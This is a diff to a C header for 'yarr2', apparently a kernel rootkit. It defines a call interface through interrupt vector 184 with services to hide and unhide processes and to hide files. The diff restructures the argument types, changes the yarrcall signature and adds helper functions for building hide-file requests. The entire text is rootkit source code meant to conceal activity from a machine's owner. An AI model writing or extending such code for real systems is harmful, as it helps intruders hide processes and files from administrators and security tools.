@@ -16,7 +16,7 @@
 #define YARR_VECTOR (184)
 
 // Here we define the different services someone can request to yarr2.
-enum YARRCALL_SERVICE {
+enum yarrcall_service {
     HIDE_PID = 1,
     UNHIDE_PID,
     HIDE_FILE,
@@ -35,7 +35,8 @@ typedef struct hidepid_args {
 } HidePidArgs_t;
 
 typedef struct hidefile_args {
-    char fname[0];
+    size_t size;
+    char fname[];
 } HideFileArgs_t;
 
 typedef struct getprocinfo_args {
@@ -43,12 +44,21 @@ typedef struct getprocinfo_args {
     pid_t tgid;
 } __GetProcInfoArgs_t;
 
-// Each service has its own arguments, we use this union to encapsulate them
-// and have easier access for each service.
-typedef union {
+union args {
     HidePidArgs_t hidepid_args;
     HideFileArgs_t hidefile_args;
     __GetProcInfoArgs_t getprocinfo_args;
+};
+
+// Each service has its own arguments, we use this union to encapsulate them
+// and have easier access for each service.
+typedef struct yarrcall_args {
+    enum yarrcall_service svc;
+    union {
+        HidePidArgs_t hidepid_args;
+        HideFileArgs_t hidefile_args;
+        __GetProcInfoArgs_t getprocinfo_args;
+    };
 } YarrcallArgs_t;
 
 /**
@@ -56,12 +66,11 @@ typedef union {
  * should use in order to request services to yarr2 module (in theory already
  * loaded into the kernel).
  *
- * @svc: The type of service we request. This should be one of the values of
- * YARRCALL_SERVICES.
  * @args: A pointer to the arguments for that specific service.
+ * @args_size: The size of the args argument.
  * @return: Zero on success, non-zero elsewhere.
  */
-long yarrcall(int svc, YarrcallArgs_t *args);
+long yarrcall(YarrcallArgs_t *args, size_t args_size);
 
 /**
  * Asks yarr2 to hide a process in the system.
@@ -70,5 +79,21 @@ long yarrcall(int svc, YarrcallArgs_t *args);
  * @return: Zero on sucess, non-zero elsewhere.
  */
 long hide_process(pid_t pid);
+
+/**
+ * Allocates a YarrcallArgs_t structure and sets the HideFileArgs_t inside of
+ * it.
+ *
+ * @fname: A string with the filename to be hidden by the HIDE_FILE service.
+ * @return: A pointer to the newly allocated structure or NULL.
+ */
+YarrcallArgs_t * YarrcallArgs_create(const char *fname);
+
+/**
+ * Frees a previously allocated YarrcallArgs_t with YarrcallArgs_create().
+ *
+ * @args: The pointer to be freed.
+ */
+void YarrcallArgs_free(YarrcallArgs_t *args);
 
 #endif
